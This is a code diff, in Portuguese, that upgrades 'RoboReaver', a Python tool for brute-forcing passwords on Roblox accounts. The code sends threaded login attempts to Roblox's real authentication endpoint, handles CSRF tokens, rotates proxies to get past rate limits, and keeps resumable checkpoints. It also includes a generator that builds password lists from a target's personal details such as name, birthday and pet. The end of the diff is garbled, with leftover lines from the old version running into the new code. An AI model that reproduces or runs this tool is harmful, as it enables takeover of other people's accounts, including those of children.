@@ -1,10 +1,11 @@
-# ================================================================= #
-#  RoboReaver v2.0 - Brute-Force Avançado para Roblox                #
-#  Autor: [Seu Nickname]                                             #
-#  GitHub: [Seu Link do GitHub]                                      #
-# ================================================================= #
+# ======================================================================= #
+#  RoboReaver v3.0 - The Annihilator Edition                              #
+#  Features: Wordlist Generator, Checkpoints, Advanced Logging & Proxies  #
+#  Autor: [Seu Nickname]                                                  #
+#  GitHub: [Seu Link do GitHub]                                           #
+# ======================================================================= #
 
-# --- Bloco de Auto-Instalação de Dependências ---
+# --- Bloco de Auto-Instalação de Dependências (Mais Robusto) ---
 import os
 import sys
 import subprocess
@@ -12,213 +13,242 @@ import time
 
 def check_and_install_dependencies():
     dependencies = ['requests', 'colorama', 'beautifulsoup4']
-    print("[*] Verificando dependências...")
+    print("[*] Verificando dependências do sistema...")
+    all_ok = True
     for dep in dependencies:
         try:
             __import__(dep)
+            print(f"  - {dep}: [OK]")
         except ImportError:
-            print(f"[*] Dependência '{dep}' não encontrada. Instalando...")
+            all_ok = False
+            print(f"  - {dep}: [NÃO ENCONTRADO]")
+            print(f"[*] Instalando '{dep}' via pip...")
             try:
                 subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
+                print(f"[+] '{dep}' instalado com sucesso.")
             except subprocess.CalledProcessError:
-                print(f"[!] FALHA AO INSTALAR '{dep}'. Por favor, instale manualmente com 'pip install {dep}' e tente novamente.")
+                print(f"[!!!] FALHA CRÍTICA ao instalar '{dep}'. Saia e tente 'pip install {dep}' manualmente.")
                 sys.exit(1)
-    print("[+] Todas as dependências estão satisfeitas.\n")
-    time.sleep(1)
+    if all_ok: print("[+] Todas as dependências estão satisfeitas.")
+    else: print("[+] Novas dependências foram instaladas.")
+    time.sleep(2)
+
+# --- Fim do Bloco de Auto-Instalação ---
 
 check_and_install_dependencies()
-# --- Fim do Bloco de Auto-Instalação ---
 
 import requests
 import threading
 from colorama import Fore, Style, init
 from itertools import cycle
+from datetime import datetime
 import json
 
 init(autoreset=True)
 
 class Estilo:
-    BRIGHT = Style.BRIGHT
-    RESET = Style.RESET_ALL
-    RED = Fore.RED
-    GREEN = Fore.GREEN
-    YELLOW = Fore.YELLOW
-    BLUE = Fore.BLUE
-    MAGENTA = Fore.MAGENTA
-    CYAN = Fore.CYAN
+    BRIGHT, RESET = Style.BRIGHT, Style.RESET_ALL
+    RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN
 
 class RoboReaver:
+    # BANNERS SÃO FEITOS COM RAW, TRIPLE-QUOTED STRINGS PARA EVITAR QUALQUER ERRO DE SINTAXE
+    BANNER_PRINCIPAL = r"""
+    ____       _           ____                     __   __
+   |  _ \ ___ | |__   ___ |  _ \ ___  __ _ _ __    |  \ /  |
+   | |_) / _ \| '_ \ / _ \| |_) / _ \/ _` | '_ \   |       |
+   |  _ < (_) | |_) | (_) |  _ <  __/ (_| | | | |  | |\ /| |
+   |_| \_\___/|_.__/ \___/|_| \_\___|\__,_|_| |_|  |_|` '|_|  v3.0
+
+               >> Annihilator Edition <<
+    """
+    BANNER_SUCESSO = r"""
+          .                                                      .
+        .n                   .                 .                  n.
+  .   .dP                  dP                   9b                 9b.    .
+ 4    qXb         .       db                   db       .         dXp     t
+dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+9XXb._       _.dXXXXb dXXXXb.                 .dXXXXb dXXXXb._       _.dXXP
+ 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXX'
+    `9XXXXXXXXXXXP' `9XX'   DIE   `98v8P'  DIE    `XXP' `9XXXXXXXXXXXP'
+        ~~~~~~~       9X.          .`GI'.         .X9       ~~~~~~~
+                      `98.   .--.   `  '   .--.   .8P'
+                        `98o--:' `-.     `o--'
+                           `--'       `--'
+                           SENHA ENCONTRADA!
+    """
+
     def __init__(self):
         self.username = ""
-        self.wordlist_path = ""
-        self.proxy_path = ""
-        self.thread_count = 0
         self.passwords = []
         self.proxies = []
         self.proxy_cycle = None
         self.senha_encontrada = None
         self.senhas_testadas = 0
         self.stop_threads = False
+        self.log_file = None
         self.lock = threading.Lock()
+        self.start_index = 0
+        self.checkpoint_file = ""
 
-    def _banner_principal(self):
-        os.system('clear')
-        print(f"""{Estilo.BRIGHT}{Estilo.RED}
-    ____       _           ____                     __   __
-   |  _ \ ___ | |__   ___ |  _ \ ___  __ _ _ __    |  \ /  |
-   | |_) / _ \| '_ \ / _ \| |_) / _ \/ _` | '_ \   |       |
-   |  _ < (_) | |_) | (_) |  _ <  __/ (_| | | | |  | |\ /| |
-   |_| \_\___/|_.__/ \___/|_| \_\___|\__,_|_| |_|  |_|` '|_|  v2.0
-           {Estilo.YELLOW}Brute-Force Avançado c/ Suporte a Proxy{Estilo.RESET}
-        """)
+    def _setup_logger(self):
+        if not os.path.exists('logs'): os.makedirs('logs')
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        log_filename = f"logs/attack_{self.username}_{timestamp}.log"
+        self.log_file = open(log_filename, 'w')
+        self._log(f"Sessão de ataque iniciada para o alvo: {self.username}")
+        self._log(f"Wordlist: {len(self.passwords)} senhas | Proxies: {len(self.proxies)}")
 
-    def _banner_sucesso(self):
-        os.system('clear')
-        key_art = f"""
-{Estilo.YELLOW}
-                     .--.
-                    /.-. '----------.
-                    \\'-' .--"--""-"-'
-                     '--'
+    def _log(self, message):
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        self.log_file.write(f"[{timestamp}] {message}\n")
+        self.log_file.flush()
 
-{Estilo.GREEN}{Estilo.BRIGHT}
-============================================================
-==                                                        ==
-==          S E N H A   E N C O N T R A D A ! ! !         ==
-==                                                        ==
-============================================================
-"""
-        print(key_art)
-        print(f"\n{Estilo.CYAN}Acesso obtido para a conta {Estilo.BOLD}{self.username}{Estilo.RESET}")
-        print(f"{Estilo.CYAN}A senha correta é:{Estilo.RESET}\n")
-        print(f"{' ' * 20}{Estilo.YELLOW}{Estilo.BRIGHT}>>> {self.senha_encontrada} <<<\n\n")
-
-    def _carregar_recursos(self):
+    def _carregar_recursos(self, wordlist_path, proxy_path):
         try:
-            print(f"{Estilo.BLUE}[*] Carregando wordlist de '{self.wordlist_path}'...{Estilo.RESET}")
-            with open(self.wordlist_path, 'r', errors='ignore') as f:
+            with open(wordlist_path, 'r', errors='ignore') as f:
                 self.passwords = [line.strip() for line in f if line.strip()]
-            if not self.passwords:
-                print(f"{Estilo.RED}[!] Sua wordlist está vazia! Abortando.{Estilo.RESET}"); return False
-            print(f"{Estilo.GREEN}[+] {len(self.passwords)} senhas carregadas.{Estilo.RESET}")
-        except FileNotFoundError:
-            print(f"{Estilo.RED}[!] Arquivo da wordlist não encontrado. Abortando.{Estilo.RESET}"); return False
+            if not self.passwords: return False, "Wordlist vazia."
+        except FileNotFoundError: return False, "Arquivo da wordlist não encontrado."
         
-        if self.proxy_path:
-            try:
-                print(f"{Estilo.BLUE}[*] Carregando proxies de '{self.proxy_path}'...{Estilo.RESET}")
-                with open(self.proxy_path, 'r', errors='ignore') as f:
-                    self.proxies = [line.strip() for line in f if line.strip()]
-                if not self.proxies:
-                    print(f"{Estilo.YELLOW}[~] Arquivo de proxy está vazio. O ataque continuará sem proxies.{Estilo.RESET}")
-                else:
-                    self.proxy_cycle = cycle(self.proxies)
-                    print(f"{Estilo.GREEN}[+] {len(self.proxies)} proxies carregados. O ataque será distribuído.{Estilo.RESET}")
-            except FileNotFoundError:
-                print(f"{Estilo.RED}[!] Arquivo de proxy não encontrado. Abortando.{Estilo.RESET}"); return False
-        
-        return True
-
-    def _verificar_username(self):
-        print(f"{Estilo.BLUE}[*] Verificando se o usuário '{self.username}' existe...{Estilo.RESET}")
-        try:
-            r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [self.username]})
-            if r.status_code == 200 and r.json()['data']:
-                print(f"{Estilo.GREEN}[+] Usuário encontrado! Prosseguindo...{Estilo.RESET}"); time.sleep(1); return True
-            else:
-                print(f"{Estilo.RED}[!] Usuário '{self.username}' não encontrado. Verifique o nome e tente novamente.{Estilo.RESET}"); return False
-        except requests.RequestException:
-            print(f"{Estilo.RED}[!] Erro de rede ao verificar usuário. Não é possível continuar.{Estilo.RESET}"); return False
-
-    def _attempt_login(self, session, password, proxy):
-        login_url = "https://auth.roblox.com/v2/login"
-        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
-        
-        try:
-            session.headers.pop('X-CSRF-TOKEN', None) # Limpa token antigo
-            response = session.post(login_url, proxies=proxies, timeout=15)
-            csrf_token = response.headers.get("x-csrf-token")
-            if not csrf_token: return False, "csrf_error"
-            
-            session.headers['X-CSRF-TOKEN'] = csrf_token
-            payload = {"ctype": "Username", "cvalue": self.username, "password": password}
-            
-            response = session.post(login_url, json=payload, proxies=proxies, timeout=15)
-            data = response.json()
-            
-            if "user" in data: return True, "success"
-            elif response.status_code == 429: return False, "rate_limit"
-            else: return False, "invalid_credentials"
-        except requests.RequestException:
-            return False, "proxy_error" if proxy else "network_error"
-
-    def _worker(self, password_queue):
-        with requests.Session() as session:
-            session.headers.update({
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-            })
-            while not self.stop_threads:
+        self.checkpoint_file = f"checkpoints/{self.username}.chk"
+        if os.path.exists(self.checkpoint_file):
+            resp = input(f"{Estilo.YELLOW}[?] Encontramos um ataque anterior para '{self.username}'. Deseja continuar de onde parou? (s/n):{Estilo.CYAN} ").lower()
+            if resp == 's':
+                with open(self.checkpoint_file, 'r') as f: last_pass = f.read().strip()
                 try:
-                    password = password_queue.get(timeout=1)
-                except:
-                    break
+                    self.start_index = self.passwords.index(last_pass) + 1
+                    print(f"{Estilo.GREEN}[+] Retomando ataque após a senha: '{last_pass}'{Estilo.RESET}")
+                except ValueError:
+                    print(f"{Estilo.RED}[!] Senha do checkpoint não encontrada na wordlist atual. Começando do início.{Estilo.RESET}")
+        
+        if proxy_path:
+            try:
+                with open(proxy_path, 'r', errors='ignore') as f: self.proxies = [line.strip() for line in f if line.strip()]
+                if self.proxies: self.proxy_cycle = cycle(self.proxies)
+            except FileNotFoundError: return False, "Arquivo de proxy não encontrado."
+        return True, "Sucesso"
+
+    def _worker(self, password_queue, thread_id):
+        with requests.Session() as s:
+            s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+            while not self.stop_threads:
+                try: password, index = password_queue.get(timeout=1)
+                except: break
                 
                 proxy = next(self.proxy_cycle) if self.proxy_cycle else None
-                success, reason = self._attempt_login(session, password, proxy)
+                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
                 
-                with self.lock:
-                    self.senhas_testadas += 1
+                try:
+                    csrf_resp = s.post("https://auth.roblox.com/v2/login", proxies=proxies, timeout=10)
+                    s.headers['X-CSRF-TOKEN'] = csrf_resp.headers["x-csrf-token"]
+                    login_resp = s.post("https://auth.roblox.com/v2/login", json={"ctype": "Username", "cvalue": self.username, "password": password}, proxies=proxies, timeout=10)
+                    
+                    with self.lock: self.senhas_testadas += 1
+                    
+                    if "user" in login_resp.json():
+                        self._log(f"SUCESSO! Senha encontrada: {password}")
+                        with self.lock: self.senha_encontrada, self.stop_threads = password, True
+                    else:
+                        self._log(f"FALHA: {password} (Proxy: {proxy or 'Nenhum'})")
+                    
+                    if self.senhas_testadas % 20 == 0: # Salva checkpoint a cada 20 tentativas
+                        with self.lock, open(self.checkpoint_file, 'w') as f: f.write(password)
+                        
+                except Exception as e:
+                    self._log(f"ERRO DE CONEXÃO: {password} (Proxy: {proxy or 'Nenhum'}) - {e}")
                 
-                if success:
-                    with self.lock:
-                        self.senha_encontrada = password
-                        self.stop_threads = True
-                    break
-        password_queue.task_done()
+                password_queue.task_done()
     
     def _display_status(self):
-        animation = cycle(['|', '/', '-', '\\\\'])
+        anim = cycle([' घूम ', ' रहा ', ' है  ', ' ?? '])
         start_time = time.time()
-        
         while not self.stop_threads:
             with self.lock:
-                total = len(self.passwords)
-                progress = int(50 * self.senhas_testadas / total) if total > 0 else 0
-                percent = (self.senhas_testadas / total) * 100 if total > 0 else 0
-                elapsed_time = time.time() - start_time
-                pass_per_second = self.senhas_testadas / elapsed_time if elapsed_time > 0 else 0
-                status_bar = f"{Estilo.GREEN}{'█' * progress}{Estilo.RED}{'-' * (50 - progress)}{Estilo.RESET}"
-                status_text = (
-                    f"{Estilo.CYAN}{next(animation)} {Estilo.YELLOW}Testando: {self.senhas_testadas}/{total} "
-                    f"[{status_bar}] {percent:.2f}% | "
-                    f"{Estilo.MAGENTA}{pass_per_second:.2f} p/s | "
-                    f"Tempo: {int(elapsed_time)}s{Estilo.RESET}"
-                )
-                sys.stdout.write(f"\r{status_text.ljust(100)}")
-            time.sleep(0.1)
+                total, tested = len(self.passwords), self.senhas_testadas + self.start_index
+                progress, percent = int(50*tested/total) if total>0 else 0, (tested/total)*100 if total>0 else 0
+                pps = tested / (time.time() - start_time) if time.time() - start_time > 0 else 0
+                bar = f"{Estilo.GREEN}{'█'*progress}{Estilo.RED}{'-'*(50-progress)}{Estilo.RESET}"
+                status = f"{Estilo.CYAN}{next(anim)} {Estilo.YELLOW}Alvo:{self.username} | Testando: {tested}/{total} [{bar}] {percent:.2f}% | {pps:.2f} p/s"
+                sys.stdout.write(f"\r{status.ljust(100)}"); sys.stdout.flush()
+            time.sleep(0.15)
         sys.stdout.write(f"\r{' ' * 100}\r")
 
+    def _generate_wordlist(self):
+        os.system('clear'); print(f"{Estilo.CYAN}--- Gerador de Wordlist Inteligente ---{Estilo.RESET}")
+        print("Forneça o máximo de informações que souber sobre o alvo. Pressione Enter para pular.")
+        info = {
+            'nome': input("Primeiro nome: "), 'sobrenome': input("Sobrenome: "), 'apelido': input("Apelido: "),
+            'dia': input("Dia de nascimento (DD): "), 'mes': input("Mês (MM): "), 'ano': input("Ano (YYYY): "),
+            'pet': input("Nome do animal de estimação: "), 'time': input("Time do coração: "),
+            'cidade': input("Cidade: "), 'idolo': input("Ídolo: ")
+        }
+        base_words = {val for val in info.values() if val}
+        with_numbers = set()
+        for word in base_words:
+            with_numbers.add(word + "123"); with_numbers.add(word + info.get('ano', '')); with_numbers.add(word + info.get('dia', ''))
+        mutations = {word.capitalize() for word in base_words} | {word.lower() for word in base_words}
+        final_list = sorted(list(base_words | with_numbers | mutations))
+        
+        filename = input(f"\n{len(final_list)} senhas geradas. Nome do arquivo para salvar (ex: wordlist_alvo.txt): ")
+        if not filename: print("Operação cancelada."); return
+        with open(filename, 'w') as f: f.write('\n'.join(final_list))
+        print(f"{Estilo.GREEN}Wordlist salva em '{filename}'. Use-a no ataque!{Estilo.RESET}"); time.sleep(3)
+
     def run(self):
-        self._banner_principal()
-        self.username = input(f"{Estilo.YELLOW}[?] Digite o username da conta Roblox: {Estilo.CYAN}")
-        if not self.username or not self._verificar_username(): time.sleep(3); return
+        os.system('clear'); print(Estilo.CYAN + self.BANNER_PRINCIPAL + Estilo.RESET)
+        choice = input(f"{Estilo.YELLOW}[1] Iniciar Ataque\n[2] Gerador de Wordlist\n[3] Sair\n> {Estilo.CYAN}")
         
-        self.wordlist_path = input(f"{Estilo.YELLOW}[?] Caminho para sua wordlist (ex: wordlist.txt): {Estilo.CYAN}")
-        self.proxy_path = input(f"{Estilo.YELLOW}[?] Caminho para proxies (opcional, deixe em branco para ignorar): {Estilo.CYAN}")
-        
-        try:
-            self.thread_count = int(input(f"{Estilo.YELLOW}[?] Threads (recom. 10-50 com proxy, 5 sem): {Estilo.CYAN}"))
-        except ValueError:
-            print(f"{Estilo.RED}[!] Número de threads inválido.{Estilo.RESET}"); time.sleep(2); return
-        
-        if not self._carregar_recursos(): time.sleep(3); return
-        
-        # Resetar estado para um novo ataque
-        self.senha_encontrada, self.senhas_testadas, self.stop_threads = None, 0, False
+        if choice == '1': self.iniciar_ataque()
+        elif choice == '2': self._generate_wordlist()
+        elif choice == '3': sys.exit(0)
+        else: print(f"{Estilo.RED}Opção inválida.{Estilo.RESET}"); time.sleep(1)
+
+    def iniciar_ataque(self):
+        os.system('clear'); print(Estilo.CYAN + self.BANNER_PRINCIPAL + Estilo.RESET)
+        self.username = input(f"{Estilo.YELLOW}[?] Username do Alvo: {Estilo.CYAN}")
+        if not self.username: print("Username inválido."); return
+        wordlist_p = input(f"{Estilo.YELLOW}[?] Caminho da Wordlist: {Estilo.CYAN}")
+        proxy_p = input(f"{Estilo.YELLOW}[?] Caminho dos Proxies (Opcional): {Estilo.CYAN}")
+        try: thread_c = int(input(f"{Estilo.YELLOW}[?] Threads (recom. 10-50): {Estilo.CYAN}"))
+        except: print("Threads inválidas."); return
+
+        ok, reason = self._carregar_recursos(wordlist_p, proxy_p); 
+        if not ok: print(f"{Estilo.RED}[!] Erro: {reason}{Estilo.RESET}"); time.sleep(3); return
+        self._setup_logger()
         
         from queue import Queue
         password_queue = Queue()
-        for p in self.passwords: password_queue.put(p)
+        for i, p in enumerate(self.passwords[self.start_index:]): password_queue.put((p, self.start_index + i))
+
+        print(f"\n{Estilo.BRIGHT}Aniquilador preparado. Iniciando ataque em 3 segundos...{Estilo.RESET}"); time.sleep(3)
+        
+        threads = [threading.Thread(target=self._worker, args=(password_queue, i), daemon=True) for i in range(thread_c)]
+        status_thread = threading.Thread(target=self._display_status, daemon=True)
+        status_thread.start(); [t.start() for t in threads]
+        
+        try: [t.join() for t in threads]
+        except KeyboardInterrupt: print(f"\n\n{Estilo.RED}Ataque interrompido.{Estilo.RESET}"); self.stop_threads = True
+        
+        self.stop_threads = True; status_thread.join()
+        
+        if self.senha_encontrada:
+            os.system('clear'); print(Estilo.YELLOW + self.BANNER_SUCESSO + Estilo.RESET)
+            print(f"\n{Estilo.GREEN}A senha para '{self.username}' é: {Estilo.BRIGHT}{self.senha_encontrada}{Estilo.RESET}")
+            if os.path.exists(self.checkpoint_file): os.remove(self.checkpoint_file) # Limpa checkpoint
+        else:
+            print(f"\n{Estilo.RED}{Estilo.BRIGHT}[X] FIM DA LINHA. Senha não encontrada.{Estilo.RESET}")
+        
+        self.log_file.close()
+        input("\nPressione Enter para voltar ao menu...")
+
+if __name__ == "__main__":
+    while True:
+        try:
+            RoboReaver().run()
+        except Exception as e:
+            print(f"\n{Estilo.RED}Erro fatal no programa: {e}. Reiniciando menu...")
+            time.sleep(4)ut(p)
         
         print(f"\n{Estilo.BRIGHT}Iniciando ataque em 3 segundos... Pressione CTRL+C para parar.{Estilo.RESET}"); time.sleep(3)
 
